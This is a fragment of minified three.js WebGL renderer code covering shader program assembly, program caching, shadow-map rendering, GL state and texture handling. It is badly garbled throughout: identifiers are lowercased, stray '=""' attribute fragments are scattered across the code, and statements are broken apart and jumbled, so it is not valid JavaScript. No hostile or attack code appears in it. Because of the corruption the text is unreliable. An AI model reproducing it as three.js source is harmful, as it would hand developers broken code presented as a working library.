three.gammaencoding:return[\"gamma\",\"(=\"\" float(=\"\" gamma_factor=\"\" )=\"\" )\"];default:throw=\"\" error(\"unsupported=\"\" encoding:=\"\" \"+=\"\" a);}}function=\"\" b(b,c){var=\"\" d=\"a(c);return\" vec4\"=\"\" \"+b+\"(=\"\" vec4=\"\" {=\"\" return=\"\" \"+d[0]+\"tolinear\"+d[1]+\";=\"\" }\"}function=\"\" c(b,c){var=\"\" linearto\"+d[0]+d[1]+\";=\"\" d(a,b){var=\"\" c;switch(b){case=\"\" three.lineartonemapping:c=\"Linear\" ;break;case=\"\" three.reinhardtonemapping:c=\"Reinhard\" three.uncharted2tonemapping:c=\"Uncharted2\" three.cineontonemapping:c=\"OptimizedCineon\" ;break;default:throw=\"\" tonemapping:=\"\" \"+b);}return\"vec3=\"\" \"+a+=\"\" \"(=\"\" vec3=\"\" color=\"\" \"+c+\"tonemapping(=\"\" );=\"\" e(a,b,c){a=\"a||{};return[a.derivatives||b.envMapCubeUV||b.bumpMap||b.normalMap||b.flatShading?\" #extension\"=\"\" gl_oes_standard_derivatives=\"\" :=\"\" enable\":\"\",(a.fragdepth||b.logarithmicdepthbuffer)&&c.get(\"ext_frag_depth\")?\"#extension=\"\" gl_ext_frag_depth=\"\" enable\":\"\",a.drawbuffers&&c.get(\"webgl_draw_buffers\")?\"#extension=\"\" gl_ext_draw_buffers=\"\" require\":\"\",(a.shadertexturelod||b.envmap)&&c.get(\"ext_shader_texture_lod\")?\"#extension=\"\" gl_ext_shader_texture_lod=\"\" enable\":=\"\" \"\"].filter(g).join(\"\\n\")}function=\"\" f(a){var=\"\" b=\"[],c;for(c\" a){var=\"\" \"+c+\"=\"\" \"+d)}return=\"\" b.join(\"\\n\")}function=\"\" g(a){return\"\"!=\"=a}function\" h(a,b){return=\"\" a.replace(=\"\" num_dir_lights=\"\" g,b.numdirlights).replace(=\"\" num_spot_lights=\"\" g,b.numspotlights).replace(=\"\" num_point_lights=\"\" g,b.numpointlights).replace(=\"\" num_hemi_lights=\"\" g,b.numhemilights)}function=\"\" k(a){return=\"\" #include=\"\" +<([\\w\\d.]+)=\"\">/g,function(a,b){var c=THREE.ShaderChunk[b];if(void 0===c)throw Error(\"Can not resolve #include <\"+ b+\"=\"\">\");return k(c)})}function l(a){return a.replace(/for \\( int i \\= (\\d+)\\; i < (\\d+)\\; i \\+\\+ \\) \\{([\\s\\S]+?)(?=\\})\\}/g,function(a,b,c,d){a=\"\";for(b=parseInt(b);b<parseint(c);b++)a+=d.replace( 0=\"==F&&(F=new\" \\[=\"\" i=\"\" \\]=\"\" g,\"[=\"\" \"+b+\"=\"\" ]\");return=\"\" a})}var=\"\" n=\"0;return\" function(a,m,q,r){var=\"\" s=\"a.context,t=q.extensions,u=q.defines,v=q.__webglShader.vertexShader,C=q.__webglShader.fragmentShader,w=\" shadowmap_type_basic\";r.shadowmaptype=\"==THREE.PCFShadowMap?w=\"SHADOWMAP_TYPE_PCF\":r.shadowMapType===THREE.PCFSoftShadowMap&&(w=\"SHADOWMAP_TYPE_PCF_SOFT\");\"\" var=\"\" e=\"ENVMAP_TYPE_CUBE\" ,z=\"ENVMAP_MODE_REFLECTION\" ,y=\"ENVMAP_BLENDING_MULTIPLY\" ;if(r.envmap){switch(q.envmap.mapping){case=\"\" three.cubereflectionmapping:case=\"\" three.cuberefractionmapping:e=\"ENVMAP_TYPE_CUBE\" ;break;case=\"\" three.cubeuvreflectionmapping:case=\"\" three.cubeuvrefractionmapping:e=\"ENVMAP_TYPE_CUBE_UV\" three.equirectangularreflectionmapping:case=\"\" three.equirectangularrefractionmapping:e=\"ENVMAP_TYPE_EQUIREC\" three.sphericalreflectionmapping:e=\"ENVMAP_TYPE_SPHERE\" }switch(q.envmap.mapping){case=\"\" three.cuberefractionmapping:case=\"\" three.equirectangularrefractionmapping:z=\"ENVMAP_MODE_REFRACTION\" }switch(q.combine){case=\"\" three.multiplyoperation:y=\"ENVMAP_BLENDING_MULTIPLY\" three.mixoperation:y=\"ENVMAP_BLENDING_MIX\" three.addoperation:y=\"ENVMAP_BLENDING_ADD\" }}var=\"\" a=\"0<a.gammaFactor?a.gammaFactor:1,t=e(t,r,a.extensions),I=f(u),B=s.createProgram();q\" instanceof=\"\" three.rawshadermaterial?(u=\"[I].filter(g).join(\" \\n\"),w=\"[I].filter(g).join(\"\\n\")):(u=[\"precision\"\" \"+r.precision+\"=\"\" float;\",\"precision=\"\" int;\",\"#define=\"\" shader_name=\"\" \"+q.__webglshader.name,=\"\" i,r.supportsvertextextures?\"#define=\"\" vertex_textures\":\"\",\"#define=\"\" gamma_factor=\"\" \"+a,\"#define=\"\" max_bones=\"\" \"+r.maxbones,r.map?\"#define=\"\" use_map\":\"\",r.envmap?\"#define=\"\" use_envmap\":\"\",r.envmap?\"#define=\"\" \"+z:\"\",r.lightmap?\"#define=\"\" use_lightmap\":\"\",r.aomap?\"#define=\"\" use_aomap\":\"\",r.emissivemap?\"#define=\"\" use_emissivemap\":\"\",r.bumpmap?\"#define=\"\" use_bumpmap\":\"\",r.normalmap?\"#define=\"\" use_normalmap\":\"\",r.displacementmap&&r.supportsvertextextures?\"#define=\"\" use_displacementmap\":\"\",r.specularmap?\"#define=\"\" use_specularmap\":=\"\" \"\",r.roughnessmap?\"#define=\"\" use_roughnessmap\":\"\",r.metalnessmap?\"#define=\"\" use_metalnessmap\":\"\",r.alphamap?\"#define=\"\" use_alphamap\":\"\",r.vertexcolors?\"#define=\"\" use_color\":\"\",r.flatshading?\"#define=\"\" flat_shaded\":\"\",r.skinning?\"#define=\"\" use_skinning\":\"\",r.usevertextexture?\"#define=\"\" bone_texture\":\"\",r.morphtargets?\"#define=\"\" use_morphtargets\":\"\",r.morphnormals&&!1=\"==r.flatShading?\" #define\"=\"\" use_morphnormals\":\"\",r.doublesided?\"#define=\"\" double_sided\":\"\",r.flipsided?\"#define=\"\" flip_sided\":\"\",\"#define=\"\" num_clipping_planes=\"\" \"+=\"\" r.numclippingplanes,r.shadowmapenabled?\"#define=\"\" use_shadowmap\":\"\",r.shadowmapenabled?\"#define=\"\" \"+w:\"\",r.sizeattenuation?\"#define=\"\" use_sizeattenuation\":\"\",r.logarithmicdepthbuffer?\"#define=\"\" use_logdepthbuf\":\"\",r.logarithmicdepthbuffer&&a.extensions.get(\"ext_frag_depth\")?\"#define=\"\" use_logdepthbuf_ext\":\"\",\"uniform=\"\" mat4=\"\" modelmatrix;\",\"uniform=\"\" modelviewmatrix;\",\"uniform=\"\" projectionmatrix;\",\"uniform=\"\" viewmatrix;\",\"uniform=\"\" mat3=\"\" normalmatrix;\",\"uniform=\"\" vec3=\"\" cameraposition;\",\"attribute=\"\" position;\",=\"\" \"attribute=\"\" normal;\",\"attribute=\"\" vec2=\"\" uv;\",\"#ifdef=\"\" use_color\",\"\\tattribute=\"\" color;\",\"#endif\",\"#ifdef=\"\" use_morphtargets\",\"\\tattribute=\"\" morphtarget0;\",\"\\tattribute=\"\" morphtarget1;\",\"\\tattribute=\"\" morphtarget2;\",\"\\tattribute=\"\" morphtarget3;\",\"\\t#ifdef=\"\" use_morphnormals\",\"\\t\\tattribute=\"\" morphnormal0;\",\"\\t\\tattribute=\"\" morphnormal1;\",\"\\t\\tattribute=\"\" morphnormal2;\",\"\\t\\tattribute=\"\" morphnormal3;\",\"\\t#else\",\"\\t\\tattribute=\"\" morphtarget4;\",\"\\t\\tattribute=\"\" morphtarget5;\",=\"\" \"\\t\\tattribute=\"\" morphtarget6;\",\"\\t\\tattribute=\"\" morphtarget7;\",\"\\t#endif\",\"#endif\",\"#ifdef=\"\" use_skinning\",\"\\tattribute=\"\" vec4=\"\" skinindex;\",\"\\tattribute=\"\" skinweight;\",\"#endif\",\"\\n\"].filter(g).join(\"\\n\"),w=\"[t,\" precision\"=\"\" \"+q.__webglshader.name,i,r.alphatest?\"#define=\"\" alphatest=\"\" \"+r.alphatest:\"\",\"#define=\"\" \"+a,r.usefog&&r.fog?\"#define=\"\" use_fog\":\"\",r.usefog&&r.fogexp?\"#define=\"\" fog_exp2\":\"\",r.map?\"#define=\"\" use_map\":=\"\" \"\",r.envmap?\"#define=\"\" \"+e:\"\",r.envmap?\"#define=\"\" \"+z:\"\",r.envmap?\"#define=\"\" \"+y:\"\",r.lightmap?\"#define=\"\" use_normalmap\":\"\",r.specularmap?\"#define=\"\" use_specularmap\":\"\",r.roughnessmap?\"#define=\"\" use_color\":=\"\" \"\",r.flatshading?\"#define=\"\" flat_shaded\":\"\",r.doublesided?\"#define=\"\" \"+r.numclippingplanes,r.shadowmapenabled?\"#define=\"\" \"+w:\"\",r.premultipliedalpha?\"#define=\"\" premultiplied_alpha\":\"\",r.physicallycorrectlights?\"#define=\"\" physically_correct_lights\":\"\",r.logarithmicdepthbuffer?\"#define=\"\" use_logdepthbuf_ext\":=\"\" \"\",r.envmap&&a.extensions.get(\"ext_shader_texture_lod\")?\"#define=\"\" texture_lod_ext\":\"\",\"uniform=\"\" cameraposition;\",r.tonemapping!=\"=THREE.NoToneMapping?\" tone_mapping\":\"\",r.tonemapping!=\"=THREE.NoToneMapping?THREE.ShaderChunk.tonemapping_pars_fragment:\" \",r.tonemapping!=\"=THREE.NoToneMapping?d(\"toneMapping\",r.toneMapping):\"\",r.outputEncoding||r.mapEncoding||r.envMapEncoding||r.emissiveMapEncoding?THREE.ShaderChunk.encodings_pars_fragment:\"\",r.mapEncoding?b(\"mapTexelToLinear\",\"\" r.mapencoding):\"\",r.envmapencoding?b(\"envmaptexeltolinear\",r.envmapencoding):\"\",r.emissivemapencoding?b(\"emissivemaptexeltolinear\",r.emissivemapencoding):\"\",r.outputencoding?c(\"lineartooutputtexel\",r.outputencoding):\"\",r.depthpacking?\"#define=\"\" depth_packing=\"\" \"+q.depthpacking:\"\",\"\\n\"].filter(g).join(\"\\n\"));v=\"k(v,r);v=h(v,r);C=k(C,r);C=h(C,r);!1===q\" three.shadermaterial&&(v=\"l(v),C=l(C));C=w+C;v=THREE.WebGLShader(s,s.VERTEX_SHADER,u+v);C=THREE.WebGLShader(s,s.FRAGMENT_SHADER,C);s.attachShader(B,\" v);s.attachshader(b,c);void=\"\" 0!=\"=q.index0AttributeName?s.bindAttribLocation(B,0,q.index0AttributeName):!0===r.morphTargets&&s.bindAttribLocation(B,0,\" position\");s.linkprogram(b);r=\"s.getProgramInfoLog(B);E=s.getShaderInfoLog(v);z=s.getShaderInfoLog(C);A=y=!0;if(!1===s.getProgramParameter(B,s.LINK_STATUS))y=!1,console.error(\"THREE.WebGLProgram:\"\" shader=\"\" error:=\"\" \",s.geterror(),\"gl.validate_status\",s.getprogramparameter(b,s.validate_status),\"gl.getprograminfolog\",r,e,z);else=\"\" if(\"\"!=\"=r)console.warn(\" three.webglprogram:\"=\"\" gl.getprograminfolog()\",=\"\" r);else=\"\" if(\"\"=\"==E||\" \"=\"==z)A=!1;A&&(this.diagnostics={runnable:y,material:q,programLog:r,vertexShader:{log:E,prefix:u},fragmentShader:{log:z,prefix:w}});s.deleteShader(v);s.deleteShader(C);var\"\" f;this.getuniforms=\"function(){void\" three.webgluniforms(s,b,a));return=\"\" f};var=\"\" k;this.getattributes=\"function(){if(void\" d=\"s.getActiveAttrib(B,c).name;a[d]=s.getAttribLocation(B,d)}K=a}return\" k};this.destroy=\"function(){s.deleteProgram(B);\" this.program=\"void\" 0};object.defineproperties(this,{uniforms:{get:function(){console.warn(\"three.webglprogram:=\"\" .uniforms=\"\" is=\"\" now=\"\" .getuniforms().\");return=\"\" this.getuniforms()}},attributes:{get:function(){console.warn(\"three.webglprogram:=\"\" .attributes=\"\" .getattributes().\");return=\"\" this.getattributes()}}});this.id=\"n++;this.code=m;this.usedTimes=1;this.program=B;this.vertexShader=v;this.fragmentShader=C;return\" this}}();=\"\" three.webglprograms=\"function(a,b){function\" c(a,b){var=\"\" c;a?a=\"\" three.texture?c=\"a.encoding:a\" three.webglrendertarget&&(console.warn(\"three.webglprograms.gettextureencodingfrommap:=\"\" don't=\"\" use=\"\" render=\"\" targets=\"\" as=\"\" textures.=\"\" their=\"\" .texture=\"\" property=\"\" instead.\"),c=\"a.texture.encoding):c=THREE.LinearEncoding;c===THREE.LinearEncoding&&b&&(c=THREE.GammaEncoding);return\" c}var=\"\" meshphongmaterial:\"phong\",meshstandardmaterial:\"physical\",meshphysicalmaterial:\"physical\",linebasicmaterial:\"basic\",linedashedmaterial:\"dashed\",pointsmaterial:\"points\"},f=\"precision supportsVertexTextures map mapEncoding envMap envMapMode envMapEncoding lightMap aoMap emissiveMap emissiveMapEncoding bumpMap normalMap displacementMap specularMap roughnessMap metalnessMap alphaMap combine vertexColors fog useFog fogExp flatShading sizeAttenuation logarithmicDepthBuffer skinning maxBones useVertexTexture morphTargets morphNormals maxMorphTargets maxMorphNormals premultipliedAlpha numDirLights numPointLights numSpotLights numHemiLights shadowMapEnabled shadowMapType toneMapping physicallyCorrectLights alphaTest doubleSided flipSided numClippingPlanes depthPacking\" .split(\"=\"\" \");=\"\" this.getparameters=\"function(d,f,k,l,n){var\" p=\"e[d.type],m;b.floatVertexTextures&&n&&n.skeleton&&n.skeleton.useVertexTexture?m=1024:(m=Math.floor((b.maxVertexUniforms-20)/4),void\" three.skinnedmesh&&(m=\"Math.min(n.skeleton.bones.length,m),m<n.skeleton.bones.length&&console.warn(\" webglrenderer:\"=\"\" too=\"\" many=\"\" bones=\"\" -=\"\" \"+n.skeleton.bones.length+\",=\"\" this=\"\" gpu=\"\" supports=\"\" just=\"\" \"+m+\"=\"\" (try=\"\" opengl=\"\" instead=\"\" of=\"\" angle)\")));var=\"\" q=\"a.getPrecision();null!==d.precision&&(q=b.getMaxPrecision(d.precision),q!==\" d.precision&&console.warn(\"three.webglprogram.getparameters:\",d.precision,\"not=\"\" supported,=\"\" using\",q,\"instead.\"));var=\"\" r=\"a.getCurrentRenderTarget();return{shaderID:p,precision:q,supportsVertexTextures:b.vertexTextures,outputEncoding:c(r?r.texture:null,a.gammaOutput),map:!!d.map,mapEncoding:c(d.map,a.gammaInput),envMap:!!d.envMap,envMapMode:d.envMap&&d.envMap.mapping,envMapEncoding:c(d.envMap,a.gammaInput),envMapCubeUV:!!d.envMap&&(d.envMap.mapping===THREE.CubeUVReflectionMapping||d.envMap.mapping===\" three.cubeuvrefractionmapping),lightmap:!!d.lightmap,aomap:!!d.aomap,emissivemap:!!d.emissivemap,emissivemapencoding:c(d.emissivemap,a.gammainput),bumpmap:!!d.bumpmap,normalmap:!!d.normalmap,displacementmap:!!d.displacementmap,roughnessmap:!!d.roughnessmap,metalnessmap:!!d.metalnessmap,specularmap:!!d.specularmap,alphamap:!!d.alphamap,combine:d.combine,vertexcolors:d.vertexcolors,fog:k,usefog:d.fog,fogexp:k=\"\" three.fogexp2,flatshading:d.shading=\"==THREE.FlatShading,sizeAttenuation:d.sizeAttenuation,\" logarithmicdepthbuffer:b.logarithmicdepthbuffer,skinning:d.skinning,maxbones:m,usevertextexture:b.floatvertextextures&&n&&n.skeleton&&n.skeleton.usevertextexture,morphtargets:d.morphtargets,morphnormals:d.morphnormals,maxmorphtargets:a.maxmorphtargets,maxmorphnormals:a.maxmorphnormals,numdirlights:f.directional.length,numpointlights:f.point.length,numspotlights:f.spot.length,numhemilights:f.hemi.length,numclippingplanes:l,shadowmapenabled:a.shadowmap.enabled&&n.receiveshadow&&0<f.shadows.length,shadowmaptype:a.shadowmap.type,=\"\" tonemapping:a.tonemapping,physicallycorrectlights:a.physicallycorrectlights,premultipliedalpha:d.premultipliedalpha,alphatest:d.alphatest,doublesided:d.side=\"==THREE.DoubleSide,flipSided:d.side===THREE.BackSide,depthPacking:void\" c=\"[];b.shaderID?c.push(b.shaderID):(c.push(a.fragmentShader),c.push(a.vertexShader));if(void\" in=\"\" a.defines)c.push(d),c.push(a.defines[d]);for(d=\"0;d<f.length;d++)c.push(b[f[d]]);\" return=\"\" c.join()};this.acquireprogram=\"function(b,c,e){for(var\" f,n=\"0,p=d.length;n<p;n++){var\" m=\"d[n];if(m.code===e){f=m;++f.usedTimes;break}}void\" three.webglprogram(a,e,b,c),d.push(f));return=\"\" f};this.releaseprogram=\"function(a){if(0===--a.usedTimes){var\" b=\"d.indexOf(a);d[b]=d[d.length-1];d.pop();a.destroy()}};this.programs=d};\" three.webglproperties=\"function(){var\" c};this.delete=\"function(b){delete\" a[b.uuid]};this.clear=\"function(){a={}}};\" three.webglshader=\"function(){function\" a(a){a=\"a.split(\" \\n\");for(var\"=\"\" \"+a[c];return=\"\" a.join(\"\\n\")}return=\"\" function(b,c,d){var=\"\" couldn't=\"\" compile.\");\"\"!=\"=b.getShaderInfoLog(e)&&console.warn(\" three.webglshader:\"=\"\" gl.getshaderinfolog()\",c=\"==b.VERTEX_SHADER?\" vertex\":\"fragment\",b.getshaderinfolog(e),a(d));return\"=\"\" e}}();=\"\" three.webglshadowmap=\"function(a,b,c){function\" d(b,c,d,e){var=\"\" f=\"b.geometry,g=null,g=r,h=b.customDepthMaterial;d&&(g=s,h=b.customDistanceMaterial);h?g=h:(b=b\" three.skinnedmesh&&c.skinning,h=\"0,void\" g}function=\"\" e(a,b,c){if(!1!=\"=a.visible){a.layers.test(b.layers)&&(a\" three.mesh||a=\"\" three.line||a=\"\" three.points)&&a.castshadow&&(!1=\"==a.frustumCulled||!0===h.intersectsObject(a))&&!0===a.material.visible&&(a.modelViewMatrix.multiplyMatrices(c.matrixWorldInverse,a.matrixWorld),q.push(a));a=a.children;for(var\" three.frustum,k=\"new\" three.matrix4,l=\"b.shadows,n=new\" three.vector2,p=\"new\" three.vector3,m=\"new\" three.vector3,q=\"[],r=Array(4),s=Array(4),t={},u=[new\" three.vector3(1,0,0),new=\"\" three.vector3(-1,0,0),new=\"\" three.vector3(0,0,1),new=\"\" three.vector3(0,=\"\" 0,-1),new=\"\" three.vector3(0,1,0),new=\"\" three.vector3(0,-1,0)],v=\"[new\" three.vector3(0,0,-1)],c=\"[new\" three.vector4,new=\"\" three.vector4];b=\"new\" three.meshdepthmaterial;b.depthpacking=\"THREE.RGBADepthPacking;b.clipping=!0;for(var\" w=\"THREE.ShaderLib.distanceRGBA,E=THREE.UniformsUtils.clone(w.uniforms),z=0;4!==z;++z){var\" y=\"0!==(z&1),A=0!==(z&2),I=b.clone();I.morphTargets=y;I.skinning=A;r[z]=I;y=new\" three.shadermaterial({defines:{use_shadowmap:\"\"},uniforms:e,vertexshader:w.vertexshader,fragmentshader:w.fragmentshader,morphtargets:y,skinning:a,clipping:!0});s[z]=\"y}var\" 1,1,1);g.disable(f.blend);g.setdepthtest(!0);g.setscissortest(!1);for(var=\"\" w,s,t=\"0,y=l.length;t<y;t++){var\" z=\"l[t],A=z.shadow;if(void\" no=\"\" shadow.\");else{var=\"\" three.pointlight){w=\"6;s=!0;var\" j=\"n.x,D=n.y;C[0].set(2*J,D,J,D);C[1].set(0,D,J,D);C[2].set(3*J,D,J,D);C[3].set(J,D,J,D);C[4].set(3*J,0,J,D);C[5].set(J,0,J,D);n.x*=4;n.y*=2}else\" three.webglrendertarget(n.x,n.y,{minfilter:three.nearestfilter,=\"\" magfilter:three.nearestfilter,format:three.rgbaformat}),e.updateprojectionmatrix());a=\"\" three.spotlightshadow&&a.update(z);j=\"A.map;A=A.matrix;m.setFromMatrixPosition(z.matrixWorld);E.position.copy(m);a.setRenderTarget(J);a.clear();for(J=0;J<w;J++){s?(p.copy(E.position),p.add(u[J]),E.up.copy(v[J]),E.lookAt(p),g.viewport(C[J])):(p.setFromMatrixPosition(z.target.matrixWorld),E.lookAt(p));E.updateMatrixWorld();E.matrixWorldInverse.getInverse(E.matrixWorld);A.set(.5,0,0,.5,0,.5,0,.5,0,0,.5,.5,\" 0,0,0,1);a.multiply(e.projectionmatrix);a.multiply(e.matrixworldinverse);k.multiplymatrices(e.projectionmatrix,e.matrixworldinverse);h.setfrommatrix(k);q.length=\"0;e(b,r,E);for(var\" three.multimaterial)for(var=\"\" ja=\"T.groups,X=X.materials,ba=0,ia=ja.length;ba<ia;ba++){var\" v=\"ja[ba],Y=X[V.materialIndex];!0===Y.visible&&(Y=d(I,Y,s,m),a.renderBufferDirect(E,null,T,Y,I,V))}else\" a.getclearcolor();s=\"a.getClearAlpha();a.setClearColor(w,s);B.needsUpdate=!1}}};\" three.webglstate=\"function(a,b,c){function\" d(b,c,d){var=\"\" uint8array(4),f=\"a.createTexture();a.bindTexture(b,f);a.texParameteri(b,a.TEXTURE_MIN_FILTER,a.NEAREST);a.texParameteri(b,a.TEXTURE_MAG_FILTER,a.NEAREST);for(b=0;b<d;b++)a.texImage2D(c+b,0,a.RGBA,1,1,0,a.RGBA,a.UNSIGNED_BYTE,e);return\" f}var=\"\" three.webglcolorbuffer(a,this),depth:new=\"\" three.webgldepthbuffer(a,this),stencil:new=\"\" three.webglstencilbuffer(a,this)};var=\"\" uint8array(f),=\"\" h=\"new\" uint8array(f),k=\"new\" uint8array(f),l=\"{},n=null,p=null,m=null,q=null,r=null,s=null,t=null,u=null,v=!1,C=null,w=null,E=null,z=null,y=null,A=null,I=a.getParameter(a.MAX_TEXTURE_IMAGE_UNITS),B=null,F={},K=new\" three.vector4,p=\"new\" three.vector4,m=\"{};M[a.TEXTURE_2D]=d(a.TEXTURE_2D,a.TEXTURE_2D,1);M[a.TEXTURE_CUBE_MAP]=d(a.TEXTURE_CUBE_MAP,a.TEXTURE_CUBE_MAP_POSITIVE_X,6);this.init=function(){this.clearColor(0,0,0,1);this.clearDepth(1);this.clearStencil(0);this.enable(a.DEPTH_TEST);this.setDepthFunc(THREE.LessEqualDepth);\" this.setflipsided(!1);this.setcullface(three.cullfaceback);this.enable(a.cull_face);this.enable(a.blend);this.setblending(three.normalblending)};this.initattributes=\"function(){for(var\" c),k[b]=\"c)};this.disableUnusedAttributes=function(){for(var\" c.length;d++)n.push(c[d]);return=\"\" n};this.setblending=\"function(b,d,e,f,g,h,k,l){if(b!==THREE.NoBlending){this.enable(a.BLEND);if(b!==p||l!==v)b===THREE.AdditiveBlending?l?(a.blendEquationSeparate(a.FUNC_ADD,a.FUNC_ADD),a.blendFuncSeparate(a.ONE,a.ONE,a.ONE,a.ONE)):(a.blendEquation(a.FUNC_ADD),a.blendFunc(a.SRC_ALPHA,a.ONE)):b===THREE.SubtractiveBlending?l?(a.blendEquationSeparate(a.FUNC_ADD,a.FUNC_ADD),a.blendFuncSeparate(a.ZERO,a.ZERO,a.ONE_MINUS_SRC_COLOR,a.ONE_MINUS_SRC_ALPHA)):(a.blendEquation(a.FUNC_ADD),\" a.blendfunc(a.zero,a.one_minus_src_color)):b=\"==THREE.MultiplyBlending?l?(a.blendEquationSeparate(a.FUNC_ADD,a.FUNC_ADD),a.blendFuncSeparate(a.ZERO,a.SRC_COLOR,a.ZERO,a.SRC_ALPHA)):(a.blendEquation(a.FUNC_ADD),a.blendFunc(a.ZERO,a.SRC_COLOR)):l?(a.blendEquationSeparate(a.FUNC_ADD,a.FUNC_ADD),a.blendFuncSeparate(a.ONE,a.ONE_MINUS_SRC_ALPHA,a.ONE,a.ONE_MINUS_SRC_ALPHA)):(a.blendEquationSeparate(a.FUNC_ADD,a.FUNC_ADD),a.blendFuncSeparate(a.SRC_ALPHA,a.ONE_MINUS_SRC_ALPHA,a.ONE,a.ONE_MINUS_SRC_ALPHA)),\" u=\"t=s=r=q=m=null}else\" this.disable(a.blend),p=\"b};this.setColorWrite=function(a){this.buffers.color.setMask(a)};this.setDepthTest=function(a){this.buffers.depth.setTest(a)};this.setDepthWrite=function(a){this.buffers.depth.setMask(a)};this.setDepthFunc=function(a){this.buffers.depth.setFunc(a)};\" this.setstenciltest=\"function(a){this.buffers.stencil.setTest(a)};this.setStencilWrite=function(a){this.buffers.stencil.setMask(a)};this.setStencilFunc=function(a,b,c){this.buffers.stencil.setFunc(a,b,c)};this.setStencilOp=function(a,b,c){this.buffers.stencil.setOp(a,b,c)};this.setFlipSided=function(b){C!==b&&(b?a.frontFace(a.CW):a.frontFace(a.CCW),C=b)};this.setCullFace=function(b){b!==THREE.CullFaceNone?(this.enable(a.CULL_FACE),b!==w&&(b===THREE.CullFaceBack?a.cullFace(a.BACK):b===THREE.CullFaceFront?\" a.cullface(a.front):a.cullface(a.front_and_back))):this.disable(a.cull_face);w=\"b};this.setLineWidth=function(b){b!==E&&(a.lineWidth(b),E=b)};this.setPolygonOffset=function(b,c,d){if(b){if(this.enable(a.POLYGON_OFFSET_FILL),z!==c||y!==d)a.polygonOffset(c,d),z=c,y=d}else\" this.disable(a.polygon_offset_fill)};this.getscissortest=\"function(){return\" a};this.setscissortest=\"function(b){(A=b)?this.enable(a.SCISSOR_TEST):this.disable(a.SCISSOR_TEST)};this.activeTexture=function(b){void\" i-1);b!=\"=b&&(a.activeTexture(b),B=b)};this.bindTexture=function(b,c){null===B&&e.activeTexture();var\" 0,texture:void=\"\" 0},f[b]=\"d);if(d.type!==b||d.texture!==c)a.bindTexture(b,c||M[b]),d.type=b,d.texture=c};this.compressedTexImage2D=function(){try{a.compressedTexImage2D.apply(a,arguments)}catch(b){console.error(b)}};this.texImage2D=function(){try{a.texImage2D.apply(a,arguments)}catch(b){console.error(b)}};this.clearColor=function(a,b,c,d){this.buffers.color.setClear(a,\" b,c,d)};this.cleardepth=\"function(a){this.buffers.depth.setClear(a)};this.clearStencil=function(a){this.buffers.stencil.setClear(a)};this.scissor=function(b){!1===K.equals(b)&&(a.scissor(b.x,b.y,b.z,b.w),K.copy(b))};this.viewport=function(b){!1===P.equals(b)&&(a.viewport(b.x,b.y,b.z,b.w),P.copy(b))};this.reset=function(){for(var\" three.webglcolorbuffer=\"function(a,b){var\" three.vector4,e=\"null,f=new\" three.vector4;this.setmask=\"function(b){e===b||c||(a.colorMask(b,b,b,b),e=b)};this.setLocked=function(a){c=a};this.setClear=function(b,c,e,l){d.set(b,c,e,l);!1===f.equals(d)&&(a.clearColor(b,c,e,l),f.copy(d))};this.reset=function(){c=!1;e=null;f=new\" three.vector4}};=\"\" three.webgldepthbuffer=\"function(a,b){var\" three.neverdepth:a.depthfunc(a.never);break;case=\"\" three.alwaysdepth:a.depthfunc(a.always);break;case=\"\" three.lessdepth:a.depthfunc(a.less);break;case=\"\" three.lessequaldepth:a.depthfunc(a.lequal);break;case=\"\" three.equaldepth:a.depthfunc(a.equal);break;case=\"\" three.greaterequaldepth:a.depthfunc(a.gequal);=\"\" break;case=\"\" three.greaterdepth:a.depthfunc(a.greater);break;case=\"\" three.notequaldepth:a.depthfunc(a.notequal);break;default:a.depthfunc(a.lequal)}else=\"\" a.depthfunc(a.lequal);e=\"b}};this.setLocked=function(a){c=a};this.setClear=function(b){f!==b&&(a.clearDepth(b),f=b)};this.reset=function(){c=!1;f=e=d=null}};\" three.webglstencilbuffer=\"function(a,b){var\" function(){c=\"!1;n=l=k=h=g=f=e=d=null}};\" three.webgltextures=\"function(a,b,c,d,e,f,g){function\" h(a,b){if(a.width=\"\">b||a.height>b){var c=b/Math.max(a.width,a.height),d=document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"canvas\");d.width=Math.floor(a.width*c);d.height=Math.floor(a.height*c);d.getContext(\"2d\").drawImage(a,0,0,a.width,a.height,0,0,d.width,d.height);console.warn(\"THREE.WebGLRenderer: image is too big (\"+a.width+\"x\"+a.height+\"). Resized to \"+d.width+\"x\"+d.height,a);return d}return a}function k(a){return THREE.Math.isPowerOfTwo(a.width)&&THREE.Math.isPowerOfTwo(a.height)}\nfunction l(b){return b===THREE.NearestFilter||b===THREE.NearestMipMapNearestFilter||b===THREE.NearestMipMapLinearFilter?a.NEAREST:a.LINEAR}function n(b){b=b.target;b.removeEventListener(\"dispose\",n);a:{var c=d.get(b);if(b.image&&c.__image__webglTextureCube)a.deleteTexture(c.__image__webglTextureCube);else{if(void 0===c.__webglInit)break a;a.deleteTexture(c.__webglTexture)}d.delete(b)}t.textures--}function p(b){b=b.target;b.removeEventListener(\"dispose\",p);var c=d.get(b),e=d.get(b.texture);if(b){void 0!==\ne.__webglTexture&&a.deleteTexture(e.__webglTexture);b.depthTexture&&b.depthTexture.dispose();if(b instanceof THREE.WebGLRenderTargetCube)for(e=0;6>e;e++)a.deleteFramebuffer(c.__webglFramebuffer[e]),c.__webglDepthbuffer&&a.deleteRenderbuffer(c.__webglDepthbuffer[e]);else a.deleteFramebuffer(c.__webglFramebuffer),c.__webglDepthbuffer&&a.deleteRenderbuffer(c.__webglDepthbuffer);d.delete(b.texture);d.delete(b)}t.textures--}function m(b,g){var m=d.get(b);if(0<b.version&&m.__version!==b.version){var 0=\"==l)console.warn(\" 1999=\"\" three.webglrenderer:\"=\"\" l=\"b.image;if(void\" texture=\"\" marked=\"\" for=\"\" update=\"\" but=\"\" image=\"\" is=\"\" undefined\",b);else=\"\" if(!1=\"==l.complete)console.warn(\" incomplete\",b);else{void=\"\" b.premultiplyalpha);a.pixelstorei(a.unpack_alignment,b.unpackalignment);var=\"\" p=\"h(b.image,e.maxTextureSize);if((b.wrapS!==THREE.ClampToEdgeWrapping||b.wrapT!==THREE.ClampToEdgeWrapping||b.minFilter!==THREE.NearestFilter&&b.minFilter!==THREE.LinearFilter)&&!1===k(p))if(l=p,l\" instanceof=\"\" htmlimageelement||l=\"\" htmlcanvaselement){var=\"\" r=\"document.createElementNS(\" http:=\"\" www.w3.org=\"\" xhtml\",\"canvas\");r.width=\"THREE.Math.nearestPowerOfTwo(l.width);r.height=THREE.Math.nearestPowerOfTwo(l.height);r.getContext(\"2d\").drawImage(l,\"\" 0,0,r.width,r.height);console.warn(\"three.webglrenderer:=\"\" not=\"\" power=\"\" of=\"\" two=\"\" (\"+l.width+\"x\"+l.height+\").=\"\" resized=\"\" 